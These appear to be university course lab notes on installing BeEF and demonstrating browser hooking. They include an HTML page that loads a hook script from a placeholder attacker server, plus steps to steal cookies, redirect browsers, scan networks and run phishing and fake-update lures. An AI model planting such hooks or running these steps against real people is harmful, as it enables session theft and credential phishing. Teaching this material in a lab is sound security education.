<h5><em>ver: Aug-2022</em></h5>

---

<h2>Browser Exploitation Framework (BeEF)</h2>

Refer to https://beefproject.com/

<h4>Setup BeEF</h4>

1. Install BeEF on Kali Linux (Not a default tool)
2. Setup BeEF configuration file (set id and password)
3. Open BeEF
4. Open a web browser and go to "http://localhost:3000/ui/authentication".
5. Enter the id and passwd to the browser

```sh
sudo apt install beef-xss
# set id/passwd. Default valeus does not work.
sudo nano /etc/beef-xss/./config.yaml
cd /usr/share/beef-xss
./beef

```

---

<h4>Exploitation Example</h4>

1. Identify attacker's ip-address

```sh
ifconfig
```

2. Identify victiom's ip-address

```sh
ipconfig
ping attack-ip-address
```

3. Create a compromised web page by hooking the BeEF script

```html
<html lang="en">
    <head>
        <title>CS 435 Demo Page (BeEF)</title>
    </head>
    <body>
        <script src="http://attacker-server-ip-address:3000/hook.js"></script>
        <h2>This is CS 435 Demo Page</h2>
        <h4>School of Arts and Sciences</h4>
        <h4>Carolina University</h4>
        <h3>THIS IS A MALICIOUS WEB-PAGE</h3>
        <a href="http://cnn.com"> LINK to "cnn.com" </a>
    </body>
</html>
```

4. A victim's web-browser access to the compromised web-server. (Attacker's server)

5. Verify hook-ups on BeEF

   5-1. Current Browser -> Details
   
   5-2. Current Browser -> Network

6. Control the victim's web-browser.

    6-1. Current Browser -> Command -> Browser -> Get Cookie -> check Command results
    
    6-2. Current Browser -> Command -> Browser -> Redirect Browser (iFrame) -> set New Favicon & Redirect URL (Monitor the url window)
    
    6-3. Current Browser -> Command -> Network -> Port Scanner -> set ip-address for scanning
    
    6-4. Current Browser -> Command -> Social Engineering -> Fake Flash Update -> set Image & Custom Payload URL
    
    6-5. Current Browser -> Command -> Social Engineering -> Google Phishing -> set XSS hook URI -> check Command results
    
    6-6. Current Browser -> Command -> Social Engineering -> Pretty Theft -> set Dialog Type & Custom Logo -> check Command results
